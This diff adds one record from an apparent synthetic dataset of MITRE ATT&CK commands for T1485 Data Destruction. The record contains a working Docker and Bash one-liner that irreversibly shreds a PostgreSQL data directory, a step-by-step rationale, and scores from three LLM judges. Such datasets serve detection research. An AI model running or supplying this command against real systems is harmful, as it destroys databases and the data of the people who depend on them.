@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm --volumes-from db01 ubuntu bash -lc 'if [ -d /var/lib/postgresql/data ]; then find /var/lib/postgresql/data -xdev -type f -print0 | xargs -0 -r shred -n 3 -z -u; sync; fi'",
+  "explanation": "Accesses the PostgreSQL data directory exposed by the db01 container and irreversibly overwrites and deletes its files, then syncs.",
+  "rationale_steps": [
+    "Use --volumes-from to gain access to db01's data storage",
+    "Scope to the PostgreSQL data directory to avoid collateral damage",
+    "Perform multi-pass shred and delete files",
+    "Sync to ensure data is written"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-fba87d13",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags for all tools used (docker run, find, xargs, shred, sync), and follows correct syntax for bash conditional statements.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using a container to access PostgreSQL data files and then employing the shred utility with secure deletion parameters (-n 3 overwrites 3 times, -z adds zeros, -u unlinks) to make the data unrecoverable, followed by sync to ensure changes are written to disk.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T00:35:40.390919Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quoting, valid Docker and Bash syntax, and correctly used flags for all utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively leverages `docker run --volumes-from` to access the target data and then uses `find` piped to `xargs` and `shred -n 3 -z -u` to robustly and irreversibly destroy and delete all files in the PostgreSQL data directory, aligning perfectly with T1485 Data Destruction.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T00:35:49.561519Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid docker flags, balanced quoting, and a correct bash if/find/xargs/shred pipeline.",
+        "semantic_score": 5,
+        "semantic_justification": "It mounts db01\u2019s volumes, targets the PostgreSQL data directory, and uses shred to overwrite and delete files followed by sync, fitting data destruction (T1485).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T00:36:20.136459Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
